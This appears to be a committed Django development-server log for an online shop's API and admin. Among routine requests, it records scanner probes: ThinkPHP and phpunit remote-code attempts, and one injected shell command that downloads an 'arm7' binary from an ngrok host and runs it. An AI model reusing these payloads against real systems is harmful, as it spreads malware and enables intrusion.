@@ -1,0 +1,551 @@
+Watching for file changes with StatReloader
+[12/Apr/2020 14:27:37] "GET /api/shop/categories/ HTTP/1.1" 200 7610
+[12/Apr/2020 14:27:37] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+[12/Apr/2020 14:27:37] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[12/Apr/2020 14:27:37] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+[12/Apr/2020 14:27:37] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+[12/Apr/2020 14:27:37] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0
+[12/Apr/2020 14:27:37] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+[12/Apr/2020 14:27:37] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[12/Apr/2020 14:27:37] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[12/Apr/2020 14:27:37] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[12/Apr/2020 14:27:37] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+[12/Apr/2020 14:27:37] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
+[12/Apr/2020 14:27:46] "GET /api/shop/categories/ HTTP/1.1" 200 7610
+[12/Apr/2020 14:28:11] "GET /api/shop/categories/ HTTP/1.1" 200 7610
+[12/Apr/2020 14:28:11] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3385
+[12/Apr/2020 14:28:11] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121457
+[12/Apr/2020 14:28:11] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1131
+[12/Apr/2020 14:28:11] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817
+[12/Apr/2020 14:28:11] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 200 88145
+[12/Apr/2020 14:28:11] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 3597
+[12/Apr/2020 14:28:11] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1719
+[12/Apr/2020 14:28:11] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 39680
+[12/Apr/2020 14:28:11] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632
+[12/Apr/2020 14:28:11] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 1268
+[12/Apr/2020 14:28:11] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
+Not Found: /favicon.ico
+[12/Apr/2020 14:28:11] "GET /favicon.ico HTTP/1.1" 404 2215
+[12/Apr/2020 14:37:14] "GET /api/shop/categories/ HTTP/1.1" 200 7610
+[12/Apr/2020 14:37:14] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1131
+[12/Apr/2020 14:37:14] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121457
+[12/Apr/2020 14:37:14] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3385
+[12/Apr/2020 14:37:14] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817
+[12/Apr/2020 14:37:15] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1719
+[12/Apr/2020 14:37:15] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 3597
+[12/Apr/2020 14:37:15] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 200 88145
+[12/Apr/2020 14:37:15] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 39680
+[12/Apr/2020 14:37:15] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632
+[12/Apr/2020 14:37:15] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 1268
+[12/Apr/2020 14:37:15] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
+[12/Apr/2020 14:37:45] "GET /admin HTTP/1.1" 301 0
+[12/Apr/2020 14:37:46] "GET /admin/ HTTP/1.1" 302 0
+[12/Apr/2020 14:37:46] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2005
+[12/Apr/2020 14:37:46] "GET /static/admin/css/base.css HTTP/1.1" 200 16378
+[12/Apr/2020 14:37:46] "GET /static/admin/css/login.css HTTP/1.1" 200 1233
+[12/Apr/2020 14:37:46] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18052
+[12/Apr/2020 14:37:46] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[12/Apr/2020 14:37:46] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[12/Apr/2020 14:37:46] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+Not Found: /favicon.ico
+[12/Apr/2020 14:37:46] "GET /favicon.ico HTTP/1.1" 404 2215
+[12/Apr/2020 14:37:53] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[12/Apr/2020 14:37:57] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[12/Apr/2020 14:37:57] "GET /admin/ HTTP/1.1" 200 7222
+[12/Apr/2020 14:37:58] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
+[12/Apr/2020 14:37:58] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[12/Apr/2020 14:37:58] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[12/Apr/2020 14:37:58] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+Not Found: /favicon.ico
+[12/Apr/2020 14:37:58] "GET /favicon.ico HTTP/1.1" 404 2215
+[12/Apr/2020 14:38:11] "GET /admin/shop/product/ HTTP/1.1" 200 29514
+[12/Apr/2020 14:38:11] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6190
+[12/Apr/2020 14:38:11] "GET /static/admin/css/forms.css HTTP/1.1" 200 8518
+[12/Apr/2020 14:38:11] "GET /admin/jsi18n/ HTTP/1.1" 200 12889
+[12/Apr/2020 14:38:11] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 280364
+[12/Apr/2020 14:38:11] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
+[12/Apr/2020 14:38:11] "GET /static/admin/js/core.js HTTP/1.1" 200 5723
+[12/Apr/2020 14:38:11] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6918
+[12/Apr/2020 14:38:12] "GET /static/admin/js/actions.js HTTP/1.1" 200 6766
+[12/Apr/2020 14:38:12] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8941
+[12/Apr/2020 14:38:12] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1530
+[12/Apr/2020 14:38:12] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10322
+[12/Apr/2020 14:38:12] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 128820
+[12/Apr/2020 14:38:12] "GET /static/admin/img/search.svg HTTP/1.1" 200 458
+[12/Apr/2020 14:38:12] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+Not Found: /favicon.ico
+[12/Apr/2020 14:38:12] "GET /favicon.ico HTTP/1.1" 404 2215
+[12/Apr/2020 14:38:24] "GET /admin/shop/ HTTP/1.1" 200 3043
+Not Found: /favicon.ico
+[12/Apr/2020 14:38:24] "GET /favicon.ico HTTP/1.1" 404 2215
+[12/Apr/2020 14:38:27] "GET /admin/shop/category/ HTTP/1.1" 200 5070
+[12/Apr/2020 14:38:27] "GET /admin/jsi18n/ HTTP/1.1" 200 12889
+Not Found: /favicon.ico
+[12/Apr/2020 14:38:27] "GET /favicon.ico HTTP/1.1" 404 2215
+[12/Apr/2020 14:38:35] "GET /admin/shop/category/2/change/ HTTP/1.1" 200 6194
+[12/Apr/2020 14:38:35] "GET /admin/jsi18n/ HTTP/1.1" 200 12889
+[12/Apr/2020 14:38:35] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
+[12/Apr/2020 14:38:35] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
+Not Found: /favicon.ico
+[12/Apr/2020 14:38:35] "GET /favicon.ico HTTP/1.1" 404 2215
+----------------------------------------
+Exception happened during processing of request from ('195.245.221.168', 63358)
+----------------------------------------
+Exception happened during processing of request from ('195.245.221.168', 63360)
+----------------------------------------
+Exception happened during processing of request from ('195.245.221.168', 63359)
+----------------------------------------
+Exception happened during processing of request from ('195.245.221.168', 63362)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /GponForm/diag_Form
+[12/Apr/2020 15:37:27] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 2243
+----------------------------------------
+Exception happened during processing of request from ('223.155.179.45', 20087)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /robots.txt
+[12/Apr/2020 16:29:44] "GET /robots.txt HTTP/1.1" 404 2212
+[12/Apr/2020 16:29:47] "GET /api/shop/categories/ HTTP/1.1" 200 7610
+Not Found: /api/shop/products/category/
+[12/Apr/2020 16:29:52] "GET /api/shop/products/category/ HTTP/1.1" 404 2771
+[12/Apr/2020 16:30:11] "GET /api/shop/categories/ HTTP/1.1" 200 7610
+Not Found: /api/shop/products/category/
+[12/Apr/2020 16:30:12] "GET /api/shop/products/category/ HTTP/1.1" 404 2771
+[12/Apr/2020 16:30:21] "GET /api/shop/categories/ HTTP/1.1" 200 7610
+[12/Apr/2020 16:37:02] "GET /api/shop/categories/ HTTP/1.1" 200 1684
+[12/Apr/2020 16:37:21] "GET /api/shop/categories/ HTTP/1.1" 200 7610
+[12/Apr/2020 16:37:21] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3385
+[12/Apr/2020 16:37:21] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121457
+[12/Apr/2020 16:37:21] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817
+[12/Apr/2020 16:37:21] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1131
+[12/Apr/2020 16:37:21] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 3597
+[12/Apr/2020 16:37:21] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1719
+[12/Apr/2020 16:37:21] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 200 88145
+[12/Apr/2020 16:37:21] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 39680
+[12/Apr/2020 16:37:21] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632
+[12/Apr/2020 16:37:21] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 1268
+[12/Apr/2020 16:37:21] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
+[12/Apr/2020 16:37:21] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 1746
+Not Found: /favicon.ico
+[12/Apr/2020 16:37:22] "GET /favicon.ico HTTP/1.1" 404 2215
+[12/Apr/2020 16:40:56] "GET /admin HTTP/1.1" 301 0
+[12/Apr/2020 16:41:02] "GET /admin HTTP/1.1" 301 0
+[12/Apr/2020 16:41:03] "GET /admin/ HTTP/1.1" 302 0
+[12/Apr/2020 16:41:03] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2005
+[12/Apr/2020 16:41:03] "GET /static/admin/css/login.css HTTP/1.1" 200 1233
+[12/Apr/2020 16:41:03] "GET /static/admin/css/base.css HTTP/1.1" 200 16378
+[12/Apr/2020 16:41:03] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18052
+[12/Apr/2020 16:41:03] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[12/Apr/2020 16:41:03] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[12/Apr/2020 16:41:03] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[12/Apr/2020 16:41:12] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 2326
+[12/Apr/2020 16:41:12] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[12/Apr/2020 16:41:22] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[12/Apr/2020 16:41:22] "GET /admin/ HTTP/1.1" 200 7222
+[12/Apr/2020 16:41:22] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
+[12/Apr/2020 16:41:22] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[12/Apr/2020 16:41:22] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[12/Apr/2020 16:41:22] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+[12/Apr/2020 16:41:49] "GET /admin/shop/product/2/change/ HTTP/1.1" 200 15036
+[12/Apr/2020 16:41:49] "GET /static/admin/css/forms.css HTTP/1.1" 200 8518
+[12/Apr/2020 16:41:49] "GET /admin/jsi18n/ HTTP/1.1" 200 12889
+[12/Apr/2020 16:41:49] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
+[12/Apr/2020 16:41:49] "GET /static/admin/js/core.js HTTP/1.1" 200 5723
+[12/Apr/2020 16:41:49] "GET /static/admin/js/inlines.js HTTP/1.1" 200 13773
+[12/Apr/2020 16:41:49] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6918
+[12/Apr/2020 16:41:49] "GET /static/admin/js/actions.js HTTP/1.1" 200 6766
+[12/Apr/2020 16:41:49] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8941
+[12/Apr/2020 16:41:49] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 280364
+[12/Apr/2020 16:41:49] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10322
+[12/Apr/2020 16:41:49] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1530
+[12/Apr/2020 16:41:49] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
+[12/Apr/2020 16:41:49] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
+[12/Apr/2020 16:41:49] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 128820
+[12/Apr/2020 16:42:11] "GET /admin/ HTTP/1.1" 200 7222
+[12/Apr/2020 16:43:45] "GET /admin/shop/product/2/change/ HTTP/1.1" 200 15036
+[12/Apr/2020 16:43:45] "GET /admin/jsi18n/ HTTP/1.1" 200 12889
+Not Found: /
+[12/Apr/2020 16:45:39] "GET / HTTP/1.1" 404 2167
+/home/dberehovets/ASTORUN_store/shop/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 12, 2020 - 14:27:31
+Django version 3.0.5, using settings 'ASTORUN_store.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+[12/Apr/2020 16:57:55] "GET /api/shop/categories/ HTTP/1.1" 200 7801
+[12/Apr/2020 16:57:55] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+[12/Apr/2020 16:57:55] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[12/Apr/2020 16:57:55] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+[12/Apr/2020 16:57:55] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+[12/Apr/2020 16:57:55] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0
+[12/Apr/2020 16:57:55] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+[12/Apr/2020 16:57:55] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[12/Apr/2020 16:57:55] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[12/Apr/2020 16:57:55] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+[12/Apr/2020 16:57:55] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[12/Apr/2020 16:57:55] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
+[12/Apr/2020 16:58:10] "GET /api/shop/products/category/2 HTTP/1.1" 301 0
+/usr/local/lib/python3.6/dist-packages/rest_framework/pagination.py:200: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'shop.models.Product'> QuerySet.
+  paginator = self.django_paginator_class(queryset, page_size)
+[12/Apr/2020 16:58:10] "GET /api/shop/products/category/2/ HTTP/1.1" 200 13290
+[12/Apr/2020 16:59:20] "GET /api/shop/products/category/1 HTTP/1.1" 301 0
+[12/Apr/2020 16:59:20] "GET /api/shop/products/category/1/ HTTP/1.1" 200 12595
+[12/Apr/2020 16:59:20] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+[12/Apr/2020 16:59:20] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[12/Apr/2020 16:59:20] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+[12/Apr/2020 16:59:20] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+[12/Apr/2020 16:59:20] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0
+[12/Apr/2020 16:59:20] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+[12/Apr/2020 16:59:20] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[12/Apr/2020 16:59:20] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[12/Apr/2020 16:59:20] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+[12/Apr/2020 16:59:20] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[12/Apr/2020 16:59:20] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
+[12/Apr/2020 16:59:54] "GET /api/shop/products/category/1/ HTTP/1.1" 200 12595
+[12/Apr/2020 17:00:10] "GET /api/shop/products/category/2/ HTTP/1.1" 200 13324
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /
+[12/Apr/2020 17:49:37] "GET / HTTP/1.1" 400 59722
+Not Found: /
+[12/Apr/2020 18:00:29] "GET / HTTP/1.1" 404 2164
+Not Found: /
+[12/Apr/2020 18:01:16] "GET / HTTP/1.1" 404 2167
+Not Found: /
+[12/Apr/2020 18:18:10] "GET / HTTP/1.1" 404 2167
+Not Found: /hudson
+[12/Apr/2020 19:14:24] "GET /hudson HTTP/1.1" 404 2200
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /
+[12/Apr/2020 19:33:50] "GET / HTTP/1.0" 400 60097
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /
+[12/Apr/2020 20:00:35] "GET / HTTP/1.1" 400 59724
+[12/Apr/2020 20:38:25] "GET /api/shop/products/category/2/ HTTP/1.1" 200 13290
+[12/Apr/2020 20:38:25] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+[12/Apr/2020 20:38:25] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[12/Apr/2020 20:38:25] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+[12/Apr/2020 20:38:25] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+[12/Apr/2020 20:38:25] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0
+[12/Apr/2020 20:38:25] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+[12/Apr/2020 20:38:25] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[12/Apr/2020 20:38:25] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[12/Apr/2020 20:38:25] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+[12/Apr/2020 20:38:25] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[12/Apr/2020 20:38:25] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
+[12/Apr/2020 20:38:38] "GET /api/shop/products/category/2/?page=2 HTTP/1.1" 200 9979
+[12/Apr/2020 20:38:40] "GET /api/shop/products/category/2/ HTTP/1.1" 200 13290
+Not Found: /
+[12/Apr/2020 21:16:27] "GET / HTTP/1.1" 404 2167
+Not Found: /solr/admin/info/system
+[12/Apr/2020 21:17:28] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2259
+Not Found: /
+[12/Apr/2020 21:21:54] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 404 2231
+Not Found: /
+[12/Apr/2020 21:21:57] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 2197
+Not Found: /index.php
+[12/Apr/2020 21:24:17] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2329
+Not Found: /
+[12/Apr/2020 22:07:25] "GET / HTTP/1.1" 404 2167
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /
+[12/Apr/2020 22:09:49] "GET / HTTP/1.0" 400 60097
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/mainfunction.cgi
+[12/Apr/2020 22:13:05] "POST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1" 400 63366
+Not Found: /
+[12/Apr/2020 22:33:46] "GET / HTTP/1.1" 404 2164
+Not Found: /
+[12/Apr/2020 23:31:47] "GET / HTTP/1.1" 404 2164
+Not Found: /phpmyadmin/scripts/setup.php
+[13/Apr/2020 00:04:03] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 2266
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Apr/2020 00:17:10] "GET / HTTP/1.0" 400 60087
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[13/Apr/2020 00:37:37] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2335
+Not Found: /
+[13/Apr/2020 00:45:35] "GET / HTTP/1.1" 404 2167
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[13/Apr/2020 01:06:39] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2336
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Apr/2020 01:21:50] "GET / HTTP/1.1" 400 59724
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[13/Apr/2020 01:21:50] "GET / HTTP/1.1" 500 59
+----------------------------------------
+Exception happened during processing of request from ('111.20.101.16', 46000)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
